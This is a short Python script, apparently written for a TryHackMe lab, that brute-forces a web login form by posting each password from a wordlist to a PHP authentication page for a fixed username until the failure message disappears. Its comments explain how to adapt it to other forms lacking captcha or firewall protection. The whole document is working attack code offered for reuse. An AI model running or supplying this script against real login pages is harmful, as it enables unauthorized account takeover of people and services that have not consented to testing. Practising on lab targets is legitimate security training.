#!/usr/bin/env python

import requests

target_url = "http://10.10.68.234/sUp3r-s3cr3t/authenticate.php"
data_dict = {"username": "enox", "password": "", "Login": "submit"}
# checking source code of page putting the name values for form section
# for login you are putting the type as submit
# You can use this script if there is no captcha or firewall
# You might need to edit username password login

with open("/root/TryHackMe/tartarus/credentials.txt", "r") as wordlist:
    print("[+] Starting wordlist attack ...")
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Incorrect password!" not in str(response.content):
            print("[+] Password Found ! >> " + word)
            exit()

print("[-] List is iterated . Password not found.")
